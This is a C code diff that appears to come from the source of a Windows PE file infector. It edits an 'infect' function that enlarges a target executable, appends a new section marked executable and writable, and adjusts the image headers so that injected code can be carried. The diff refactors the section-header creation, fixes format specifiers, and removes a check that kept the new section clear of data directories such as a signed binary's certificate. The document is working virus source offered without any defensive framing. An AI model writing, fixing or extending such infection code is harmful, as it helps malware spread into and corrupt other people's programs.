@@ -24,7 +24,7 @@ int infect(const char* filename, data_t* data) {
     return 2;
   }
 
-  printf("src size: %d B\n", fileView.size);
+  printf("src size: %lu B\n", fileView.size);
 
   uint32_t extendedSize = fileView.size + ntHeaders->OptionalHeader.FileAlignment + ALIGN_VALUE(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
   close_file_view(&fileView, data);
@@ -34,7 +34,7 @@ int infect(const char* filename, data_t* data) {
     return 1;
   }
 
-  printf("ext size: %d B\n", fileView.size);
+  printf("ext size: %lu B\n", fileView.size);
 
   ntHeaders = get_nt_header(fileView.startAddress);
 
@@ -42,13 +42,24 @@ int infect(const char* filename, data_t* data) {
   sectionHeader += ntHeaders->FileHeader.NumberOfSections;
 
   if (!is_section_header_empty(sectionHeader)) {
-    return 7;
+    close_file_view(&fileView, data);
+    return 3;
   }
 
   //File will be altered after here
 
   ntHeaders->OptionalHeader.SizeOfCode += ALIGN_VALUE(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
   ntHeaders->OptionalHeader.SizeOfImage += extendedSize;
+
+  create_section_header(sectionHeader, ntHeaders, data);
+
+  data->functions.flushViewOfFile(fileView.startAddress, extendedSize);
+  close_file_view(&fileView, data);
+
+  return 0;
+}
+
+void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS* ntHeaders, data_t* data) {
   ntHeaders->FileHeader.NumberOfSections++;
 
   sectionHeader->Name[0] = '.';
@@ -63,32 +74,6 @@ int infect(const char* filename, data_t* data) {
   sectionHeader->SizeOfRawData = ALIGN_VALUE(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
   sectionHeader->PointerToRawData = (sectionHeader - 1)->PointerToRawData + ALIGN_VALUE((sectionHeader - 1)->SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
   sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
-
-  //To not overwrite data directory entries, like certificate in firefox.exe
-  for(int i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; i++) {
-    IMAGE_DATA_DIRECTORY* ptr = &ntHeaders->OptionalHeader.DataDirectory[i];
-    DWORD secStart = sectionHeader->PointerToRawData;
-    DWORD secEnd = sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData;
-    DWORD dirStart = ptr->VirtualAddress;
-    DWORD dirEnd = ptr->VirtualAddress + ptr->Size;
-    if (  (secStart >= dirStart &&
-          secStart < dirEnd) ||
-          (secEnd >= dirStart &&
-          secEnd < dirEnd) ||
-          (secStart <= dirStart &&
-          secEnd >= dirEnd) ) {
-            sectionHeader->PointerToRawData = ALIGN_VALUE(dirEnd, ntHeaders->OptionalHeader.FileAlignment);
-            printf("REPOSITIONED! from 0x%X to 0x%X\n", secStart, sectionHeader->PointerToRawData);
-          }
-  }
-
-  printf("Virtual address: 0x%X\n", sectionHeader->VirtualAddress);
-  printf("ptr to raw data: 0x%X\n", sectionHeader->PointerToRawData);
-
-  data->functions.flushViewOfFile(fileView.startAddress, extendedSize);
-  close_file_view(&fileView, data);
-
-  return 0;
 }
 
 int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
@@ -104,7 +89,7 @@ int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
     return 1;
   }
   if(fileView->size == 0) {
-    fileView->size = data->functions.getFileSize(fileView->hFile, NULL);
+    fileView->size = (DWORD)data->functions.getFileSize(fileView->hFile, NULL);
     if (fileView->size == INVALID_FILE_SIZE) {
       data->functions.closeHandle(fileView->hFile);
       return 2;
